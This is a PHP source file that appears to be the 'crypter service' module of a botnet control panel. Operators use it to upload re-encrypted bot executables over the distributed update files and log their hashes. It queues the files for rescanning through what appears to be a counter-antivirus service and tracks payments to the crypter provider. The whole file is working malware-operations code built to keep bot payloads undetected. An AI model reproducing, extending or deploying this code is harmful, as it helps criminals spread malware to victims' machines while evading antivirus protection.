<?php
require 'system/lib/guiutil.php';

if (isset($_GET['ajax'])){
	switch ($ajax = $_GET['ajax']){
		case 'pay':
		case 'unpay':
			if (empty($userData['r_svc_crypter_pay'])) die('DENIED!');
			$id = (int)$_GET['id'];
			
			if ($ajax == 'pay'){
				$t = time();	$act = 'unpay';	$echo = LNG_DIV_HISTORY_PAID.': '.date_short($t);
				} else {
				$t = 'NULL';	$act = 'pay';		$echo = LNG_DIV_HISTORY_PAY;
				}
			
			
			$R = mysql_query("UPDATE `exe_updates_crypter` SET `paid_date`=$t WHERE `id`=$id;");
			echo $R ? "<a href=\"?m=svc_crypter&id=$id&ajax=$act\" class=\"ajax_replace\">$echo</a>" : mysql_error();
			break;
		}
	die();
	}

ThemeBegin(LNG_THEME_TITLE, 0, getBotJsMenu('botmenu'), 0);


if (!is_writable('files'))
	echo '<div class="error">', 
		LNG_WARNING_PERMISSIONS, '"files/"', 
		'</div>';

set_time_limit(60*5); # Don't interfere with stupid limits

/* ==========[ FILES' UPLOAD ]========== */
echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_DIV_UPLOAD), THEME_LIST_BEGIN.THEME_LIST_TITLE);
echo '<tr><td>';

/* Files available for the upload */
$files = array();
$R = mysql_query('SELECT `id`, `file` FROM `exe_updates` ORDER BY `mtime` ASC;');
while ($R && !is_bool($r = mysql_fetch_assoc($R)))
	if (file_exists("files/{$r['file']}"))
		$files[ $r['id'] ] = $r['file'];

/* Upload handling */
if (isset($_POST['file_id'], $_FILES['file'])){
	if (empty($userData['r_svc_crypter_crypt']))
		die('DENIED!');
	
	$file_id = (int)$_POST['file_id'];
	$destination = null;
	if (isset($files[$file_id]))
		$destination = 'files/'.$files[$file_id];
	
	$upl = $_FILES['file'];
	if ($upl['error'] != UPLOAD_ERR_OK)
		echo '<div class="error">', LNG_DIV_UPLOAD_ERROR, $upl['error'], '</div>';
		elseif ($upl['size'] == 0)
		echo '<div class="error">', LNG_DIV_UPLOAD_ERROR, '∞', ': size=0</div>';
		elseif (!is_null($destination)){
		if (move_uploaded_file($upl['tmp_name'], $destination)){
			echo '<div class="success">', LNG_DIV_UPLOAD_SUCCESS;
			# Insert history
			$md5 = md5_file($destination);
			$ctime = time();
			mysql_query("INSERT INTO `exe_updates_crypter` SET `file_id`=$file_id, `hash`='$md5', `ctime`=$ctime;");
			if (mysql_affected_rows() != 1)
				echo ' (dup)';
				else {
				# Mark it for rescan
				mysql_query("UPDATE `exe_updates` SET `scan_date`=0, `scan_count`=0 WHERE `id`=$file_id;");
				}
			echo '</div>';
			}
			else
			echo '<div class="success">', LNG_DIV_UPLOAD_ERROR, '?: move_uploaded_file()', '</div>';
		}
	}

/* Form */
echo '<form method="POST" enctype="multipart/form-data" />';
echo '<select name="file_id">';
foreach ($files as $file_id => $file)
	echo '<option value="', $file_id, '">', $file, '</option>';
echo '</select> ';
echo '<input type="file" name="file" /> ';

if (!empty($userData['r_svc_crypter_crypt']))
	echo '<input type="submit" value="', LNG_DIV_UPLOAD_SUBMIT, '" />';
	else
	echo '<div class="error">', LNG_DIV_UPLOAD_NOPERM, '</div>';
echo '</form>';

echo '</tr>';
echo THEME_LIST_END.THEME_STRING_NEWLINE;



/* ==========[ FILES' HISTORY ]========== */
$files_ids = implode(',', array_keys($files));
$R = mysql_query(<<<SQL
	SELECT
		`h`.`id`,
		`h`.`file_id`,
		`f`.`file`,
		`h`.`ctime`,
		`h`.`hash`,
		`h`.`paid_date`
	FROM `exe_updates_crypter` `h`
		LEFT JOIN `exe_updates` `f` ON(`f`.`id` = `h`.`file_id`)
	WHERE `h`.`file_id` IN ($files_ids) 
	ORDER BY `h`.`ctime` DESC
	LIMIT 50;
SQL
	);

/* Display */
echo str_replace(array('{WIDTH}','{COLUMNS_COUNT}','{TEXT}'),array('100%', 1, LNG_DIV_HISTORY), THEME_LIST_BEGIN.THEME_LIST_TITLE);

if (!empty($userData['r_svc_crypter_pay']) 
	&& isset($GLOBALS['config']['scan4you_jid'])
	&& strpos($GLOBALS['config']['scan4you_jid'], ',') === FALSE)
		echo '<tr><td>', LNG_HINT_JABBERS, '</td></tr>';

echo '<tr><td><table id="crypter-history">';
echo '<THEAD><tr>',
	'<th>', LNG_DIV_HISTORY_FILENAME, '</th>',
	'<th>', LNG_DIV_HISTORY_DATE, '</th>',
	'<th>', LNG_DIV_HISTORY_PAID, '</th>',
	'</tr></THEAD>';
echo '<TBODY>';
while ($R && !is_bool($r = mysql_fetch_assoc($R))){
	echo '<tr>';
	echo '<td>', '<span title="', $r['hash'], '">', $r['file'], '</td>';
	echo '<td>', date_short($r['ctime']), '</td>';
	$dt = is_null($r['paid_date'])? null : date_short($r['paid_date']);
	if (empty($userData['r_svc_crypter_pay']))
		echo '<td>', 
				is_null($dt)
					? '<b>X</b>'
					: $dt 
				,'</td>';
		else {
		echo '<td>', 
			is_null($dt)
				?( '<a href="?m=svc_crypter&ajax=pay&id='.$r['id'].'" class="ajax_replace">'.LNG_DIV_HISTORY_PAY.'</a>' )
				:( '<a href="?m=svc_crypter&ajax=unpay&id='.$r['id'].'" class="ajax_replace">'.$dt.'</a>' ),
			'</td>';
		}
	echo '</tr>';
	}
echo '</TBODY></table></tr>';
echo THEME_LIST_END.THEME_STRING_NEWLINE;



echo '</td></tr>', THEME_DIALOG_END, ThemeEnd();
